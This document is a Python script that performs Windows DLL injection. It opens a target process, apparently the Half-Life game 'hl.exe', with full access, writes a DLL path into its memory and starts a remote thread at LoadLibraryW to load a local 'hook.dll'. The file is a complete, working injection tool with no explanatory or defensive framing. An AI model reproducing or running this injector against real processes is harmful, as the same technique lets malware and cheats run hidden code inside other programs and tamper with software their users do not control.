import sys
import ctypes
import os
import subprocess
from win32com.client import GetObject
from ctypes import wintypes


class _SECURITY_ATTRIBUTES(ctypes.Structure):
    _fields_ = [('nLength', wintypes.DWORD),
                ('lpSecurityDescriptor', wintypes.LPVOID),
                ('bInheritHandle', wintypes.BOOL), ]


LPSECURITY_ATTRIBUTES = ctypes.POINTER(_SECURITY_ATTRIBUTES)
PAGE_READWRITE = 0x04
PROCESS_ALL_ACCESS = (0x00F0000 | 0x00100000 | 0xFFF)
VIRTUAL_MEM = (0x1000 | 0x2000)

kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)


kernel32.OpenProcess.restype = wintypes.HANDLE
kernel32.OpenProcess.argtypes = (wintypes.DWORD, wintypes.BOOL, wintypes.DWORD)

kernel32.GetModuleHandleW.restype = wintypes.HMODULE
kernel32.GetModuleHandleW.argtypes = [wintypes.LPCWSTR]

kernel32.GetProcAddress.restype = wintypes.LPVOID
kernel32.GetProcAddress.argtypes = [wintypes.HANDLE, wintypes.LPCSTR]

kernel32.VirtualAllocEx.restype = wintypes.LPVOID
kernel32.VirtualAllocEx.argtypes = [wintypes.HANDLE, wintypes.LPVOID, ctypes.c_size_t, wintypes.DWORD, wintypes.DWORD]

kernel32.WriteProcessMemory.restype = wintypes.BOOL
kernel32.WriteProcessMemory.argtypes = [wintypes.HANDLE, wintypes.LPVOID, wintypes.LPCVOID,
                                        wintypes.DWORD, ctypes.POINTER(ctypes.c_int)]

kernel32.CreateRemoteThread.restype = wintypes.HANDLE
kernel32.CreateRemoteThread.argtypes = (wintypes.HANDLE, LPSECURITY_ATTRIBUTES, ctypes.c_size_t,
                                        wintypes.LPVOID, wintypes.LPVOID, wintypes.DWORD, wintypes.LPDWORD)


WMI = GetObject('winmgmts:')


def get_pid(proc):
    p = WMI.ExecQuery(f'select * from Win32_Process where Name="{proc}"')
    pid = p[0].Properties_('ProcessId').Value  # derp, forgot the value
    print(f"[+] Process ID of {proc} is {pid}")
    return pid


def find_loadlibrary_addr_by_python():
    h_kernel32 = kernel32.GetModuleHandleW('kernel32.dll')
    if not h_kernel32:
        print(f"[!] Couldn't get kernel32")
        return None

    h_loadlib = kernel32.GetProcAddress(h_kernel32, b"LoadLibraryW")
    if not h_loadlib:
        error = ctypes.get_last_error()
        print(f"[!] Couldn't get loadlib", h_loadlib, kernel32.LoadLibraryW)
        print("ERROR: %d - %s" % (error, ctypes.FormatError(error)))
        return None
    print(f"[+] LoadLibraryW address = {hex(h_loadlib)}")
    return h_loadlib


def find_loadlibrary_addr_by_c():
    path = ".\\hook\\hook\\Release\\AddrFinder.exe"
    path_x64 = ".\\hook\\hook\\x64\\Release\\AddrFinder.exe"
    addr = int(subprocess.check_output(path), 16)
    addr_x64 = int(subprocess.check_output(path_x64), 16)
    print(f"[+] LoadLibraryW addrs: {addr:x}, {addr_x64:x}")
    return addr, addr_x64


def inject_to_process(pid, dll_path):
    if not os.path.exists(dll_path):
        print(f"[!] {dll_path} not exists!")
        return None

    dll_path = os.path.abspath(dll_path)
    dll_len = (len(dll_path) + 1) * 2  # wchar_size

    h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, int(pid))
    if not h_process:
        print(f"[!] Couldn't get handle to PID: {pid}")
        print(f"[!] Are you sure {pid} is a valid PID?")
        return None

    arg_address = kernel32.VirtualAllocEx(h_process, 0, dll_len, VIRTUAL_MEM, PAGE_READWRITE)
    print(f"[+] Writing path to {arg_address:x}")

    h_loadlib, _ = find_loadlibrary_addr_by_c()

    written = ctypes.c_int(0)
    write_status = kernel32.WriteProcessMemory(h_process, arg_address, dll_path, dll_len, ctypes.byref(written))
    print(f"[+] Written {written} bytes, status = {write_status}")

    thread_id = ctypes.c_ulong(0)
    handle = kernel32.CreateRemoteThread(h_process, None, 0, h_loadlib, arg_address, 0, ctypes.byref(thread_id))
    if not handle:
        print("[!] Failed to inject DLL, exit...")
        return None

    print(f"[+] Remote Thread with ID 0x{thread_id.value:08x} to handle {handle} created with dll {dll_path}")
    return handle, thread_id.value


if __name__ == "__main__":
    # pid = get_pid("svencoop.exe")
    pid = get_pid("hl.exe")
    inject_to_process(pid, ".\\hook\\hook\\Debug\\hook.dll")
